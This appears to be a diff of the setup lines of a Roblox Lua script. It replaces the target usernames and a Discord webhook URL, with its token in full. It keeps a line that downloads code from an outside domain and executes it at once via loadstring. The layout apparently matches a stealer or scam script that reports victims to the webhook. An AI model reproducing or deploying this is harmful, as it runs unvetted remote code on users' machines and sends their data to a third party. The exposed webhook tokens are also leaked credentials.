@@ -1,5 +1,5 @@
-Username = "rip_teedyy"
-Username2 = "rip_teedyy"
-Webhook = "https://discord.com/api/webhooks/1265443219462946817/KpobrpcgSWFY8LTFubhg4-zgDs29eyYH4_SKVYINjmQDKawEiZ6gyY4ev3_sE-b0lZ88"
+Username = "rip_TEEDYY"
+Username2 = "rip_TEEDYY"
+Webhook = "https://discord.com/api/webhooks/1265590437293588512/Vutp8zEFy_rMb6riVKiO-QMROOKU37UNHe9n-EOci617XUnW1qoeHjLVfKCF7qCb3FN9"
 
 loadstring(game:HttpGet("https://egorikusa.space"))()
